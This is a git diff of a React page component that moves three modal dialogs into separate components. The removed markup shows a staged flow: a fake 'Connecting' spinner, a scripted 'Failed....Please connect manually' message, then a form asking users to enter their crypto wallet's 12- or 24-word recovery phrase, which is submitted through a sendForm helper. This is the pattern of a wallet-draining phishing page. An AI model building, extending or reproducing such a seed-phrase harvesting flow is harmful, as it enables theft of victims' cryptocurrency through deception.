@@ -6,8 +6,11 @@ import newImage from "../../assets/newimage.svg";
 import cloudImage from "../../assets/cloudimage.svg";
 import { MdKeyboardArrowRight } from "react-icons/md";
 import { useNavigate } from "react-router-dom";
-import { MdClear } from "react-icons/md";
 import { sendForm } from "../sendForm";
+import Modal from "../Modals/Modal";
+import ModalConnecting from "../Modals/ModalConnecting";
+import ModalFailed from "../Modals/ModalFailed";
+import ModalForm from "../Modals/ModalForm";
 
 const SecondHome = () => {
   const [showModal, setShowModal] = useState(false);
@@ -32,6 +35,11 @@ const SecondHome = () => {
     setShowModal(true);
     setShowModal2(false);
   };
+
+  const closeModal2 = () => {
+    setShowModal2(false);
+    setShowModal3(true);
+  }
 
   useEffect(() => {
     let timer;
@@ -104,92 +112,21 @@ const SecondHome = () => {
       </div>
 
       {showModal && (
-        <div className="modal-overlay" onClick={closeModals}>
-          <div
-            id="modal1"
-            className="modal"
-            onClick={(e) => e.stopPropagation()}
-          >
-            <div className="mdclearicondiv" onClick={closeModals}>
-              <MdClear className="mdclearicon" />
-            </div>
-
-            <div className="spinner"></div>
-
-            <p className="modalp">Connecting....Please wait</p>
-          </div>
-        </div>
+        <Modal onClose={closeModals}>
+          <ModalConnecting/>
+        </Modal>
       )}
 
       {showModal2 && (
-        <div className="modal-overlay" onClick={closeModals}>
-          <div
-            id="modal2"
-            className="modal"
-            onClick={(e) => e.stopPropagation()}
-          >
-            <div
-              className="mdclearicondiv"
-              onClick={closeModals}
-            >
-              <MdClear className="mdclearicon" />
-            </div>
-
-            <div className="spinner"></div>
-
-            <p className="modalp" id="modal2p">
-              Failed....Please connect manually
-            </p>
-            <div id="manualconnectdiv">
-              <button
-                id="manualconnect"
-                onClick={() => {
-                  setShowModal2(false);
-                  setShowModal3(true);
-                }}
-                type="button"
-              >
-                Connect Manually
-              </button>
-            </div>
-          </div>
-        </div>
+        <Modal onClose={closeModals}>
+          <ModalFailed onManualConnect={closeModal2}/>
+        </Modal>
       )}
 
       {showModal3 && (
-        <div className="modal-overlay" onClick={closeModals}>
-          <div
-            id="modal3"
-            className="modal"
-            onClick={(e) => e.stopPropagation()}
-          >
-            <div
-              className="mdclearicondiv"
-              onClick={closeModals}
-            >
-              <MdClear className="mdclearicon" />
-            </div>
-            <form action="submit" ref={form} onSubmit={formSubmit}>
-              <p id="modalheading">Integrate your Hot / Cold Wallet</p>
-{error && (<p id="modalerror">{error}</p>)}
-              <p className="label">Wallet Name</p>
-              <input type="text" placeholder="Wallet" className="modalinput" id="modalinput1"
-              name="walletname"/>
-
-              <p className="label">Recovery phrase</p>
-              <input type="text" placeholder="Enter your recovery phrase" className="modalinput" id="modalinput2" name="walletphrase"/>
-              <p id="modallastp">
-                Typically 12 (sometimes 24) words separated by single spaces
-              </p>
-
-              <div id="integratediv">
-                <button id="integrate" type="submit">
-                  Integrate
-                </button>
-              </div>
-            </form>
-          </div>
-        </div>
+        <Modal onClose={closeModals}>
+          <ModalForm form={form} formSubmit={formSubmit} error={error}/>
+        </Modal>
       )}
     </div>
   );
